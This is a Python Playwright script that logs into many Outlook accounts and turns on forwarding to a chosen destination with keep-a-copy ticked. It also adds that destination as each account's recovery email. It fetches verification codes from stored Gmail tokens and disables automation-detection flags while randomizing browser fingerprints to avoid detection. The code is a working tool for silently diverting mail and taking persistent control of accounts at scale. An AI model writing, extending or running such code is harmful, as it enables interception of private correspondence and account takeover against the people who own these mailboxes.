"""Verify-and-fix forwarding for accounts previously marked done.

Per account: log in, READ the forwarding settings (forensic dump).
If already correct -> "confirmed". If wrong/missing -> set it:
toggle on, fill destination, tick keep-a-copy, Save. Saving pops a
Microsoft recovery-method dialog; per Joseph's method, choose
"Review recovery method" and add the DESTINATION address itself as
the account's recovery email, then return to the panel, re-apply if
needed, and RE-READ from a fresh page load. Only a matching read-back
counts as fixed_confirmed. Recovery outcome is recorded per account:
added | code_required | failed | none_needed.
Writes fix.json incrementally; screenshots for early accounts.
"""
import argparse, asyncio, json, random
from playwright.async_api import async_playwright
from forward import login, load_accounts, dest_for
from verify import read_settings, interpret, UAS, VWS, TZS

RESULTS = {}
SHOT_BUDGET = [16]
RECOVERY_MODE = ["code"]

def save():
    with open("fix.json", "w") as f:
        json.dump(RESULTS, f, indent=1)

def is_correct(s, dest):
    return bool(s) and s.get("enabled") == "true" and (s.get("address") or "").strip().lower() == dest.lower()

async def shot(page, idx, tag):
    if SHOT_BUDGET[0] > 0:
        try:
            await page.screenshot(path=f"fix-{idx}-{tag}.png")
            SHOT_BUDGET[0] -= 1
        except Exception:
            pass

async def body_text(page):
    try:
        return await page.inner_text("body")
    except Exception:
        return ""

async def click_button(scope, names, timeout=5000):
    for name in names:
        try:
            btn = scope.get_by_role("button", name=name).first
            await btn.wait_for(state="visible", timeout=timeout)
            try:
                await btn.click(timeout=6000)
            except Exception:
                await btn.evaluate("el => el.click()")
            return name
        except Exception:
            continue
    return None

async def open_panel(page):
    await page.goto("https://outlook.live.com/mail/0/options/mail/forwarding",
                    wait_until="domcontentloaded", timeout=60000)
    for _ in range(20):
        t = await body_text(page)
        if "Enable forwarding" in t:
            break
        await page.wait_for_timeout(3000)
    await page.wait_for_timeout(3000)

async def apply_fields(page, dest, idx, steps, tag):
    """Toggle on + fill address + keep-a-copy. Returns True if fields set."""
    modal = page.locator(".optionsModal").first
    clicked = False
    for make in [lambda: modal.get_by_text("Enable forwarding", exact=False).first,
                 lambda: page.get_by_text("Enable forwarding", exact=False).first]:
        try:
            el = make()
            await el.wait_for(state="visible", timeout=8000)
            await el.click(timeout=8000)
            clicked = True
            break
        except Exception:
            continue
    steps[f"{tag}_toggle_clicked"] = clicked
    if not clicked:
        return False
    await page.wait_for_timeout(2500)
    dump = await page.evaluate("""() => {
      const cbs = [];
      document.querySelectorAll('input[type="checkbox"]').forEach(el => {
        const w = el.closest('label') || el.parentElement;
        cbs.push({checked: el.checked, label: w ? (w.innerText||'').slice(0,60) : ''});
      });
      return cbs;
    }""")
    on = any(c["checked"] and "nable forwarding" in (c["label"] or "") for c in dump)
    if not on:
        try:
            await page.evaluate("""() => {
              const els = document.querySelectorAll('input[type="checkbox"]');
              for (const el of els) {
                const w = el.closest('label') || el.parentElement;
                if (w && (w.innerText||'').includes('Enable forwarding')) { el.click(); return true; }
              }
              return false;
            }""")
            await page.wait_for_timeout(2500)
            dump = await page.evaluate("""() => {
              const cbs = [];
              document.querySelectorAll('input[type="checkbox"]').forEach(el => {
                const w = el.closest('label') || el.parentElement;
                cbs.push({checked: el.checked, label: w ? (w.innerText||'').slice(0,60) : ''});
              });
              return cbs;
            }""")
            on = any(c["checked"] and "nable forwarding" in (c["label"] or "") for c in dump)
        except Exception:
            pass
    steps[f"{tag}_toggle_on"] = on
    if not on:
        return False
    try:
        box = modal.locator('input[type="text"], input[type="email"]').first
        await box.wait_for(state="visible", timeout=10000)
        await box.click(timeout=5000)
        await box.fill(dest)
        await page.wait_for_timeout(800)
        val = await box.input_value()
        steps[f"{tag}_address_value"] = val
        if val.strip().lower() != dest.lower():
            return False
        await page.keyboard.press("Tab")
    except Exception as e:
        steps[f"{tag}_fill_error"] = str(e)[:100]
        return False
    try:
        cbs = modal.locator('input[type="checkbox"]')
        n = await cbs.count()
        for i in range(n):
            cb = cbs.nth(i)
            lab = await cb.evaluate("""el => {
              const w = el.closest('label') || el.parentElement;
              return w ? (w.innerText||'') : '';
            }""")
            if "keep a copy" in lab.lower() and not await cb.is_checked():
                await cb.evaluate("el => el.click()")
                steps[f"{tag}_keep_copy"] = True
    except Exception:
        pass
    return True

async def save_panel(page):
    modal = page.locator(".optionsModal").first
    for scope in [modal, page]:
        name = await click_button(scope, ["Save"], timeout=6000)
        if name:
            await page.wait_for_timeout(3000)
            return True
    return False

async def dialog_present(page):
    t = (await body_text(page)).lower()
    return "recovery method" in t

async def dismiss_dialog(page):
    modal = page.locator(".optionsModal").first
    for scope in [page, modal]:
        if await click_button(scope, ["Not now"], timeout=4000):
            await page.wait_for_timeout(2500)
            return True
    return False

async def explore_no_code(work, idx, steps):
    """Click 'I don't have a code' and observe. NEVER confirms a
    security-info replacement; stops after recording the options."""
    try:
        el = work.get_by_text("I don't have a code", exact=False).first
        await el.wait_for(state="visible", timeout=6000)
        await el.click(timeout=6000)
        steps["nocode_clicked"] = True
    except Exception as e:
        steps["nocode_click_error"] = str(e)[:80]
        return "nocode_unavailable"
    await work.wait_for_timeout(5000)
    await shot(work, idx, "nocode1")
    t = (await body_text(work)).lower()
    steps["nocode_page_text"] = t[:500]
    # A password-verification alternative is safe to complete
    try:
        pw = work.locator('input[type="password"]').first
        if await pw.count() > 0 and await pw.is_visible():
            steps["nocode_offers_password"] = True
            return "nocode_password_path"
    except Exception:
        pass
    if "30 day" in t or "30-day" in t or "can't access" in t or "cannot access" in t:
        return "nocode_30day_wait"
    if "replace" in t or "update your security info" in t:
        return "nocode_replace_offer"
    return "nocode_explored"

async def handle_recovery(page, dest, acc, idx, steps):
    """Joseph's method: Review recovery method -> add dest as recovery email.
    Returns added | code_required | failed."""
    modal = page.locator(".optionsModal").first
    ctx = page.context
    before = list(ctx.pages)
    name = None
    for scope in [page, modal]:
        name = await click_button(scope, ["Review recovery method"], timeout=6000)
        if name:
            break
    steps["review_clicked"] = bool(name)
    if not name:
        return "failed"
    await page.wait_for_timeout(6000)
    work = page
    try:
        now = list(ctx.pages)
        if len(now) > len(before):
            work = now[-1]
            await work.wait_for_load_state("domcontentloaded")
            await work.wait_for_timeout(4000)
    except Exception:
        pass
    steps["recovery_url"] = work.url[:90]
    await shot(work, idx, "rec1")
    for rnd in range(10):
        text = (await body_text(work)).lower()
        # success: the destination is now listed as a proof on this page
        if "ways to prove who you are" in text and dest.lower() in text:
            return "added"
        # success fallback: after the code step, an email proof exists on the list
        if ("ways to prove who you are" in text and steps.get("rec_code_step")
                and ("email" in text) and "add another way" in text):
            return "added"
        # password re-entry
        try:
            pw = work.locator('input[type="password"]').first
            if await pw.count() > 0 and await pw.is_visible():
                await pw.fill(acc["password"])
                steps["rec_password_filled"] = True
                await click_button(work, ["Sign in", "Next", "Verify", "Submit"], timeout=4000)
                await work.wait_for_timeout(5000)
                continue
        except Exception:
            pass
        # code entry visible? fetch the code from the account's token inbox
        code_box = None
        for sel in ['input[name="ProofCode"]', 'input[id*="code" i]', 'input[aria-label*="code" i]',
                    'input[type="tel"]', 'input[inputmode="numeric"]']:
            try:
                inp = work.locator(sel).first
                if await inp.count() > 0 and await inp.is_visible():
                    code_box = inp
                    break
            except Exception:
                continue
        if code_box is not None or "enter the code" in text or "we sent a code" in text:
            steps["rec_code_step"] = True
            await shot(work, idx, "rec-code")
            if RECOVERY_MODE[0] == "nocode":
                return await explore_no_code(work, idx, steps)
            code = None
            rt, cid = acc.get("refresh_token", ""), acc.get("client_id", "")
            if rt and cid:
                from forward import get_verification_code_from_gmail
                code = await asyncio.to_thread(get_verification_code_from_gmail, rt, cid, 120)
            steps["rec_code_fetched"] = bool(code)
            if not code:
                return "code_required"
            try:
                if code_box is not None:
                    await code_box.click(timeout=4000)
                    await code_box.fill(code)
                else:
                    # multi-box code entry: type it
                    await work.keyboard.type(code, delay=60)
                await click_button(work, ["Next", "Verify", "Submit", "OK"], timeout=5000)
                await work.wait_for_timeout(5000)
                await shot(work, idx, "rec-code-done")
                continue
            except Exception as e:
                steps["rec_code_fill_error"] = str(e)[:80]
                return "code_required"
        # proofs page: open the "add another way" dialog
        if "add another way to sign in" in text:
            try:
                el = work.get_by_text("Add another way to sign in", exact=False).first
                await el.click(timeout=6000)
                steps["rec_add_way_clicked"] = True
                await work.wait_for_timeout(3500)
                continue
            except Exception:
                pass
        # add-way dialog: choose "Email a code"
        if "add a new way to sign in or verify" in text or "email a code" in text:
            try:
                el = work.get_by_text("Email a code", exact=False).first
                await el.click(timeout=6000)
                steps["rec_email_code_clicked"] = True
                await work.wait_for_timeout(3500)
                continue
            except Exception:
                pass
        # email entry box
        email_box = None
        for sel in ['input[type="email"]', 'input[name="Email"]', 'input[name="EmailAddress"]',
                    'input[placeholder*="mail" i]', 'input[aria-label*="mail" i]']:
            try:
                inp = work.locator(sel).first
                if await inp.count() > 0 and await inp.is_visible():
                    email_box = inp
                    break
            except Exception:
                continue
        if email_box is not None:
            try:
                await email_box.click(timeout=4000)
                await email_box.fill(dest)
                steps["rec_email_filled"] = True
            except Exception as e:
                steps["rec_email_fill_error"] = str(e)[:80]
            clicked = await click_button(work, ["Next", "Add", "Save", "Submit", "Verify", "OK", "Done"], timeout=5000)
            steps["rec_submit"] = clicked
            await work.wait_for_timeout(5000)
            await shot(work, idx, "rec2")
            continue
        await work.wait_for_timeout(3000)
    await shot(work, idx, "rec-end")
    try:
        if dest.lower() in (await body_text(work)).lower():
            return "added"
    except Exception:
        pass
    return "failed"

async def quick_state(page):
    """Interpret the panel as currently rendered (no navigation)."""
    from verify import read_settings_dump
    import verify as _v
    # dump without the goto: evaluate DUMP_JS on the current page
    await page.wait_for_timeout(1500)
    dump = await page.evaluate(_v.DUMP_JS)
    return interpret(dump)

async def verify_fresh_session(idx, acc, dest):
    """Triple check: brand-new browser + fresh login, read the settings.
    Returns the interpreted settings dict from the independent session."""
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, args=["--disable-blink-features=AutomationControlled"])
        try:
            ctx = await browser.new_context(
                user_agent=random.choice(UAS), viewport=random.choice(VWS),
                locale="en-US", timezone_id=random.choice(TZS),
                color_scheme="light", device_scale_factor=1)
            page = await ctx.new_page()
            ok = await login(page, acc)
            if not ok:
                return {"enabled": None, "address": None, "wall": False, "login": False}
            s = await read_settings(page, idx)
            s["login"] = True
            return s
        finally:
            try:
                await browser.close()
            except Exception:
                pass

async def fix_one(idx, acc):
    dest = dest_for(idx)
    res = {"idx": idx, "email": acc["email"], "dest": dest, "recovery": "none_needed"}
    steps = {}
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, args=["--disable-blink-features=AutomationControlled"])
        try:
            ctx = await browser.new_context(
                user_agent=random.choice(UAS), viewport=random.choice(VWS),
                locale="en-US", timezone_id=random.choice(TZS),
                color_scheme="light", device_scale_factor=1)
            await ctx.clear_cookies()
            page = await ctx.new_page()
            ok = await login(page, acc)
            res["login"] = bool(ok)
            print(f"[{idx}] {acc['email']} login={'OK' if ok else 'FAILED'}", flush=True)
            if not ok:
                res["status"] = "login_failed"
            else:
                s1 = await read_settings(page, idx)
                res["before"] = {"enabled": s1.get("enabled"), "address": s1.get("address"), "wall": s1.get("wall")}
                print(f"[{idx}] BEFORE enabled={s1.get('enabled')} address={s1.get('address')!r} wall={s1.get('wall')}", flush=True)
                if s1.get("wall"):
                    res["status"] = "wall"
                elif is_correct(s1, dest):
                    res["status"] = "confirmed"
                else:
                    await open_panel(page)
                    if await apply_fields(page, dest, idx, steps, "first"):
                        await shot(page, idx, "beforesave")
                        await save_panel(page)
                        if await dialog_present(page):
                            outcome = await handle_recovery(page, dest, acc, idx, steps)
                            res["recovery"] = outcome
                            print(f"[{idx}] recovery outcome: {outcome}", flush=True)
                            # return to the Outlook tab + panel
                            try:
                                pages = list(ctx.pages)
                                for pg in pages:
                                    if "outlook" in pg.url:
                                        page = pg
                                        break
                            except Exception:
                                pass
                        # re-check (cheap, in-page) and re-apply if needed
                        s2 = await quick_state(page)
                        if not is_correct(s2, dest):
                            await open_panel(page)
                            if await apply_fields(page, dest, idx, steps, "second"):
                                await save_panel(page)
                                if await dialog_present(page):
                                    await dismiss_dialog(page)
                                    await save_panel(page)
                        s3 = await read_settings(page, idx)
                        res["after"] = {"enabled": s3.get("enabled"), "address": s3.get("address"), "wall": s3.get("wall")}
                        print(f"[{idx}] AFTER enabled={s3.get('enabled')} address={s3.get('address')!r}", flush=True)
                        res["status"] = "fixed_confirmed" if is_correct(s3, dest) else "fix_failed"
                    else:
                        res["status"] = "fix_failed"
                        res["after"] = {"enabled": s1.get("enabled"), "address": s1.get("address")}
        except Exception as e:
            res["status"] = "error"
            res["error"] = str(e)[:200]
            print(f"[{idx}] ERROR {res['error']}", flush=True)
        finally:
            try:
                await browser.close()
            except Exception:
                pass
    # Triple check: independent fresh-session verification for positives
    if res.get("status") in ("confirmed", "fixed_confirmed"):
        try:
            tv = await verify_fresh_session(idx, acc, dest)
            res["triple"] = {"enabled": tv.get("enabled"), "address": tv.get("address"), "login": tv.get("login")}
            res["triple_checked"] = bool(is_correct(tv, dest))
        except Exception as e:
            res["triple_checked"] = False
            res["triple_error"] = str(e)[:120]
        if not res.get("triple_checked"):
            res["status"] = "triple_check_failed"
        print(f"[{idx}] TRIPLE {'PASS' if res.get('triple_checked') else 'FAIL'}", flush=True)
    res["steps"] = steps
    RESULTS[acc["email"]] = res
    save()
    print(f"[{idx}] STATUS {res['status']} recovery={res.get('recovery')}", flush=True)

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--indices", required=True)
    ap.add_argument("--concurrency", type=int, default=1)
    ap.add_argument("--recovery-mode", default="code")
    args = ap.parse_args()
    RECOVERY_MODE[0] = args.recovery_mode
    accounts = load_accounts()
    idxs = [int(x) for x in args.indices.split(",") if x.strip()]
    sem = asyncio.Semaphore(max(1, args.concurrency))
    async def guarded(i):
        async with sem:
            await fix_one(i, accounts[i])
    await asyncio.gather(*[guarded(i) for i in idxs])
    from collections import Counter
    print("FIX DONE", Counter(r["status"] for r in RESULTS.values()), flush=True)

if __name__ == "__main__":
    asyncio.run(main())
